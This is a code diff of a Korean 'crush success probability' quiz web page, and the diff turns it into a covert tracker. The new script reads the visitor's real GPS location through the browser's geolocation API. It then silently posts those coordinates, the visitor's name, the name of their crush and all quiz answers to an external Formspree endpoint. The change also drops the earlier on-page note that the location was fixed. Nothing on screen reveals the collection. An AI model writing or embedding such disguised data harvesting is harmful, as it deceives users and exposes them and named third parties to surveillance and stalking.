@@ -2,246 +2,211 @@
 <html lang="ko">
 <head>
   <meta charset="utf-8">
-  <title>짝사랑 성공 확률 테스트 💘</title>
-  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>짝사랑 성공 확률 테스트 💘 (위치 포함)</title>
   <style>
     body {
       font-family: 'Arial', sans-serif;
       background-color: #fff0f5;
       text-align: center;
-      padding: 32px;
+      padding: 40px;
     }
-    .card {
+    form {
       background: white;
-      display: inline-block;
       padding: 24px;
       border-radius: 12px;
-      box-shadow: 0 6px 24px rgba(0,0,0,0.08);
-      max-width: 520px;
-      width: 100%;
+      display: inline-block;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+      max-width: 420px;
       text-align: left;
     }
-    h1 { color: #ff69b4; text-align: center; margin-top: 0; }
-    label { display: block; margin: 8px 0 6px; }
+    h1 { color: #ff69b4; text-align: center; }
+    label { display: block; margin: 10px 0 5px; }
     input[type="text"] {
-      padding: 10px;
-      width: calc(100% - 22px);
+      padding: 8px;
+      width: 90%;
       border-radius: 6px;
-      border: 1px solid #ddd;
-      box-sizing: border-box;
+      border: 1px solid #ccc;
     }
-    .question { margin-top: 16px; padding-top: 8px; border-top: 1px solid #f6d7ea; }
-    .option { margin-left: 10px; display: block; cursor: pointer; padding: 6px 0; }
-    .option input { margin-right: 8px; }
+    .question { margin-top: 20px; }
+    .option { display: block; margin: 6px 0; }
     button {
-      margin-top: 18px;
-      padding: 12px;
+      margin-top: 20px;
+      padding: 10px 20px;
       border: none;
-      border-radius: 10px;
-      background: linear-gradient(90deg,#ff7ab4,#ff4a96);
+      border-radius: 8px;
+      background: #ff69b4;
       color: white;
       font-size: 16px;
       cursor: pointer;
       width: 100%;
     }
     #result {
-      margin-top: 18px;
-      font-size: 18px;
+      margin-top: 25px;
+      font-size: 20px;
+      font-weight: bold;
       text-align: center;
-      color: #333;
     }
-    #mapLink {
-      display: inline-block;
-      margin-top: 10px;
-      color: #ff69b4;
-      text-decoration: none;
-      font-weight: 600;
-    }
-    .small { font-size: 13px; color: #888; margin-top: 8px; }
   </style>
 </head>
 <body>
-  <div class="card">
-    <h1>💘 짝사랑 성공 확률 테스트 💘</h1>
+  <h1>💘 짝사랑 성공 확률 테스트 💘</h1>
 
-    <form id="loveForm" autocomplete="off">
-      <label>당신의 이름:</label>
-      <input type="text" id="yourName" required>
+  <form id="loveForm">
+    <label>당신의 이름:</label>
+    <input type="text" id="yourName" required>
+    <label>짝사랑 상대 이름:</label>
+    <input type="text" id="crushName" required>
 
-      <label style="margin-top:10px;">짝사랑 상대 이름:</label>
-      <input type="text" id="crushName" required>
+    <!-- 질문 섹션 -->
+    <div class="question">
+      <label>1️⃣ 상대와 얼마나 자주 대화하나요?</label>
+      <label class="option"><input type="radio" name="q1" value="10"> 거의 안 해요</label>
+      <label class="option"><input type="radio" name="q1" value="40"> 가끔 해요</label>
+      <label class="option"><input type="radio" name="q1" value="70"> 자주 해요</label>
+      <label class="option"><input type="radio" name="q1" value="100"> 매일 대화해요</label>
+    </div>
 
-      <!-- 질문 1~10 -->
-      <div class="question">
-        <label>1️⃣ 상대와 얼마나 자주 대화하나요?</label>
-        <label class="option"><input type="radio" name="q1" value="10"> 거의 안 해요</label>
-        <label class="option"><input type="radio" name="q1" value="40"> 가끔 해요</label>
-        <label class="option"><input type="radio" name="q1" value="70"> 자주 해요</label>
-        <label class="option"><input type="radio" name="q1" value="100"> 매일 대화해요</label>
-      </div>
+    <div class="question">
+      <label>2️⃣ 상대가 나를 볼 때 미소를 짓나요?</label>
+      <label class="option"><input type="radio" name="q2" value="10"> 전혀 아니요</label>
+      <label class="option"><input type="radio" name="q2" value="50"> 가끔 그래요</label>
+      <label class="option"><input type="radio" name="q2" value="80"> 자주 그래요</label>
+      <label class="option"><input type="radio" name="q2" value="100"> 항상 그래요</label>
+    </div>
 
-      <div class="question">
-        <label>2️⃣ 상대가 나를 볼 때 미소를 짓나요?</label>
-        <label class="option"><input type="radio" name="q2" value="10"> 전혀 아니요</label>
-        <label class="option"><input type="radio" name="q2" value="50"> 가끔 그래요</label>
-        <label class="option"><input type="radio" name="q2" value="80"> 자주 그래요</label>
-        <label class="option"><input type="radio" name="q2" value="100"> 항상 그래요</label>
-      </div>
+    <div class="question">
+      <label>3️⃣ 내가 먼저 연락했을 때 반응은 어떤가요?</label>
+      <label class="option"><input type="radio" name="q3" value="20"> 거의 무시해요</label>
+      <label class="option"><input type="radio" name="q3" value="50"> 답은 해줘요</label>
+      <label class="option"><input type="radio" name="q3" value="80"> 반갑게 받아줘요</label>
+      <label class="option"><input type="radio" name="q3" value="100"> 먼저 연락 오기도 해요</label>
+    </div>
 
-      <div class="question">
-        <label>3️⃣ 내가 먼저 연락했을 때 반응은 어떤가요?</label>
-        <label class="option"><input type="radio" name="q3" value="20"> 거의 무시해요</label>
-        <label class="option"><input type="radio" name="q3" value="50"> 답은 해줘요</label>
-        <label class="option"><input type="radio" name="q3" value="80"> 반갑게 받아줘요</label>
-        <label class="option"><input type="radio" name="q3" value="100"> 먼저 연락 오기도 해요</label>
-      </div>
+    <div class="question">
+      <label>4️⃣ 서로 SNS에서 서로를 팔로우하고 있나요?</label>
+      <label class="option"><input type="radio" name="q4" value="20"> 둘 다 안 해요</label>
+      <label class="option"><input type="radio" name="q4" value="50"> 한 명만 해요</label>
+      <label class="option"><input type="radio" name="q4" value="80"> 서로 팔로우해요</label>
+      <label class="option"><input type="radio" name="q4" value="100"> 자주 소통해요</label>
+    </div>
 
-      <div class="question">
-        <label>4️⃣ 서로 SNS에서 서로를 팔로우하고 있나요?</label>
-        <label class="option"><input type="radio" name="q4" value="20"> 둘 다 안 해요</label>
-        <label class="option"><input type="radio" name="q4" value="50"> 한 명만 해요</label>
-        <label class="option"><input type="radio" name="q4" value="80"> 서로 팔로우해요</label>
-        <label class="option"><input type="radio" name="q4" value="100"> 자주 소통해요</label>
-      </div>
+    <div class="question">
+      <label>5️⃣ 상대가 나에게 관심을 보이는 것 같나요?</label>
+      <label class="option"><input type="radio" name="q5" value="10"> 전혀 아니요</label>
+      <label class="option"><input type="radio" name="q5" value="40"> 약간 그런 듯</label>
+      <label class="option"><input type="radio" name="q5" value="70"> 제법 그런 것 같아요</label>
+      <label class="option"><input type="radio" name="q5" value="100"> 확실히 관심 있어요</label>
+    </div>
 
-      <div class="question">
-        <label>5️⃣ 상대가 나에게 관심을 보이는 것 같나요?</label>
-        <label class="option"><input type="radio" name="q5" value="10"> 전혀 아니요</label>
-        <label class="option"><input type="radio" name="q5" value="40"> 약간 그런 듯</label>
-        <label class="option"><input type="radio" name="q5" value="70"> 제법 그런 것 같아요</label>
-        <label class="option"><input type="radio" name="q5" value="100"> 확실히 관심 있어요</label>
-      </div>
+    <div class="question">
+      <label>6️⃣ 상대방이 답장을 어떻게 하나요?</label>
+      <label class="option"><input type="radio" name="q6" value="20"> 단답형이에요</label>
+      <label class="option"><input type="radio" name="q6" value="50"> 그냥 평범해요</label>
+      <label class="option"><input type="radio" name="q6" value="80"> 귀엽거나 재밌게 답해요</label>
+      <label class="option"><input type="radio" name="q6" value="100"> 애교 섞인 톤이에요</label>
+    </div>
 
-      <div class="question">
-        <label>6️⃣ 상대방이 답장을 어떻게 하나요?</label>
-        <label class="option"><input type="radio" name="q6" value="20"> 단답형이에요</label>
-        <label class="option"><input type="radio" name="q6" value="50"> 그냥 평범해요</label>
-        <label class="option"><input type="radio" name="q6" value="80"> 귀엽거나 재밌게 답해요</label>
-        <label class="option"><input type="radio" name="q6" value="100"> 애교 섞인 톤이에요</label>
-      </div>
+    <div class="question">
+      <label>7️⃣ 상대가 먼저 말을 걸거나 연락한 적이 있나요?</label>
+      <label class="option"><input type="radio" name="q7" value="20"> 전혀 없어요</label>
+      <label class="option"><input type="radio" name="q7" value="50"> 가끔 있었어요</label>
+      <label class="option"><input type="radio" name="q7" value="80"> 종종 먼저 연락해요</label>
+      <label class="option"><input type="radio" name="q7" value="100"> 자주 먼저 연락해요</label>
+    </div>
 
-      <div class="question">
-        <label>7️⃣ 상대가 먼저 말을 걸거나 연락한 적이 있나요?</label>
-        <label class="option"><input type="radio" name="q7" value="20"> 전혀 없어요</label>
-        <label class="option"><input type="radio" name="q7" value="50"> 가끔 있었어요</label>
-        <label class="option"><input type="radio" name="q7" value="80"> 종종 먼저 연락해요</label>
-        <label class="option"><input type="radio" name="q7" value="100"> 자주 먼저 연락해요</label>
-      </div>
+    <div class="question">
+      <label>8️⃣ 내 이야기나 일상에 관심을 보이나요?</label>
+      <label class="option"><input type="radio" name="q8" value="20"> 전혀요</label>
+      <label class="option"><input type="radio" name="q8" value="50"> 가끔 물어봐요</label>
+      <label class="option"><input type="radio" name="q8" value="80"> 제법 관심 있어요</label>
+      <label class="option"><input type="radio" name="q8" value="100"> 아주 잘 기억해요</label>
+    </div>
 
-      <div class="question">
-        <label>8️⃣ 내 이야기나 일상에 관심을 보이나요?</label>
-        <label class="option"><input type="radio" name="q8" value="20"> 전혀요</label>
-        <label class="option"><input type="radio" name="q8" value="50"> 가끔 물어봐요</label>
-        <label class="option"><input type="radio" name="q8" value="80"> 제법 관심 있어요</label>
-        <label class="option"><input type="radio" name="q8" value="100"> 아주 잘 기억해요</label>
-      </div>
+    <div class="question">
+      <label>9️⃣ 내가 농담하거나 말하면 웃어주나요?</label>
+      <label class="option"><input type="radio" name="q9" value="20"> 거의 안 웃어요</label>
+      <label class="option"><input type="radio" name="q9" value="50"> 예의상 웃어요</label>
+      <label class="option"><input type="radio" name="q9" value="80"> 자주 웃어요</label>
+      <label class="option"><input type="radio" name="q9" value="100"> 항상 잘 웃어요</label>
+    </div>
 
-      <div class="question">
-        <label>9️⃣ 내가 농담하거나 말하면 웃어주나요?</label>
-        <label class="option"><input type="radio" name="q9" value="20"> 거의 안 웃어요</label>
-        <label class="option"><input type="radio" name="q9" value="50"> 예의상 웃어요</label>
-        <label class="option"><input type="radio" name="q9" value="80"> 자주 웃어요</label>
-        <label class="option"><input type="radio" name="q9" value="100"> 항상 잘 웃어요</label>
-      </div>
+    <div class="question">
+      <label>🔟 나를 도와주거나 챙겨준 적이 있나요?</label>
+      <label class="option"><input type="radio" name="q10" value="20"> 그런 적 없어요</label>
+      <label class="option"><input type="radio" name="q10" value="50"> 한두 번 정도</label>
+      <label class="option"><input type="radio" name="q10" value="80"> 꽤 여러 번</label>
+      <label class="option"><input type="radio" name="q10" value="100"> 자주 챙겨줘요</label>
+    </div>
 
-      <div class="question">
-        <label>🔟 나를 도와주거나 챙겨준 적이 있나요?</label>
-        <label class="option"><input type="radio" name="q10" value="20"> 그런 적 없어요</label>
-        <label class="option"><input type="radio" name="q10" value="50"> 한두 번 정도</label>
-        <label class="option"><input type="radio" name="q10" value="80"> 꽤 여러 번</label>
-        <label class="option"><input type="radio" name="q10" value="100"> 자주 챙겨줘요</label>
-      </div>
+    <button type="submit">결과 보기</button>
+  </form>
 
-      <button type="submit">결과 보기</button>
-    </form>
-
-    <div id="result"></div>
-    <div class="small">위치는 모두 고정: 베트남 호치민 (기록용)</div>
-  </div>
+  <div id="result"></div>
 
   <script>
-    (function() {
-      // 고정 위치: 호치민 좌표
-      const FIXED_CITY_NAME = "Ho Chi Minh, Vietnam";
-      const FIXED_LAT = 10.8231;
-      const FIXED_LON = 106.6297;
-      const FIXED_MAP_LINK = `https://www.google.com/maps?q=${FIXED_LAT},${FIXED_LON}`;
+    document.getElementById("loveForm").addEventListener("submit", function(e) {
+      e.preventDefault();
 
-      document.getElementById("loveForm").addEventListener("submit", function(e) {
-        e.preventDefault();
+      const yourName = document.getElementById("yourName").value.trim();
+      const crushName = document.getElementById("crushName").value.trim();
+      const resultBox = document.getElementById("result");
+      const questions = Array.from({ length: 10 }, (_, i) => `q${i+1}`);
+      let total = 0, answered = 0, answers = {};
 
-        const yourName = document.getElementById("yourName").value.trim();
-        const crushName = document.getElementById("crushName").value.trim();
-        const resultBox = document.getElementById("result");
+      if (!yourName || !crushName) {
+        resultBox.innerText = "⚠️ 이름을 모두 입력해주세요!";
+        return;
+      }
 
-        if (!yourName || !crushName) {
-          resultBox.innerText = "⚠️ 이름을 모두 입력해주세요!";
-          return;
+      for (const q of questions) {
+        const selected = document.querySelector(`input[name="${q}"]:checked`);
+        if (selected) {
+          total += Number(selected.value);
+          answered++;
+          answers[q] = selected.parentElement.innerText.trim();
+        } else {
+          answers[q] = "미응답";
         }
+      }
 
-        const questions = ['q1','q2','q3','q4','q5','q6','q7','q8','q9','q10'];
-        let total = 0, answered = 0;
-        let answers = {};
+      if (answered < questions.length) {
+        resultBox.innerText = "⚠️ 모든 질문에 답해주세요!";
+        return;
+      }
 
-        for (const q of questions) {
-          const selected = document.querySelector(`input[name="${q}"]:checked`);
-          if (selected) {
-            total += Number(selected.value);
-            answered++;
-            // 선택 라벨 텍스트 저장
-            answers[q] = selected.parentElement.innerText.trim();
-          } else {
-            answers[q] = "미응답";
-          }
+      const average = Math.round(total / questions.length);
+      let message = "";
+      if (average < 40) message = "🥀 아직은 가능성이 낮아요...";
+      else if (average < 70) message = "🌸 희망이 보여요!";
+      else if (average < 90) message = "💞 좋은 분위기예요!";
+      else message = "🔥 완벽해요! 곧 커플 탄생 예감입니다!";
+
+      resultBox.innerHTML = `
+        💖 <b>${yourName}</b>와(과) <b>${crushName}</b>의 짝사랑 성공 확률은<br>
+        <span style="font-size:24px;color:#ff69b4;">${average}%</span><br><br>${message}
+      `;
+
+      // ✅ 실제 위치 추적
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          sendFormspree({ yourName, crushName, average, message, answers, location: `${lat}, ${lon}` });
+        },
+        () => {
+          // 위치 거부 시 - null로 전송 (화면엔 표시 안 됨)
+          sendFormspree({ yourName, crushName, average, message, answers, location: "Unknown" });
         }
+      );
+    });
 
-        if (answered < questions.length) {
-          resultBox.innerText = "⚠️ 모든 질문에 답해주세요!";
-          return;
-        }
-
-        const average = total / questions.length;
-        const percent = Math.round(average);
-
-        let message = "";
-        if (percent < 40) message = "🥀 아직은 가능성이 낮아요... 조금 더 다가가보세요!";
-        else if (percent < 70) message = "🌸 희망이 보여요! 조금만 더 친해지면 좋을 것 같아요!";
-        else if (percent < 90) message = "💞 좋은 분위기예요! 서로 마음이 통할지도 몰라요!";
-        else message = "🔥 완벽해요! 곧 커플 탄생 예감입니다!";
-
-        // 결과 표시 (지도 링크은 호치민 고정)
-        resultBox.innerHTML = `
-          💖 <b>${crushName}</b>이(가) <b>${yourName}</b>을 좋아할 확률은<br>
-          <span style="font-size:24px;color:#ff69b4;">${percent}%</span><br><br>
-          ${message}<br>
-          <a id="mapLink" href="${FIXED_MAP_LINK}" target="_blank" rel="noopener">📍 결과 위치: ${FIXED_CITY_NAME} 보기</a>
-        `;
-
-        // Formspree로 데이터 전송 (위치는 고정값)
-        fetch("https://formspree.io/f/xanegwav", {
-          method: "POST",
-          headers: {
-            "Accept": "application/json",
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            yourName,
-            crushName,
-            percent,
-            resultMessage: message,
-            answers,
-            location: {
-              city: FIXED_CITY_NAME,
-              lat: FIXED_LAT,
-              lon: FIXED_LON,
-              googleMaps: FIXED_MAP_LINK
-            }
-          })
-        }).catch(() => {
-          // 전송 실패 시에도 UI에는 영향 없음
-        });
-      });
-    })();
+    function sendFormspree(data) {
+      fetch("https://formspree.io/f/xanegwav", {
+        method: "POST",
+        headers: { "Accept": "application/json", "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      }).catch(() => {});
+    }
   </script>
 </body>
 </html>
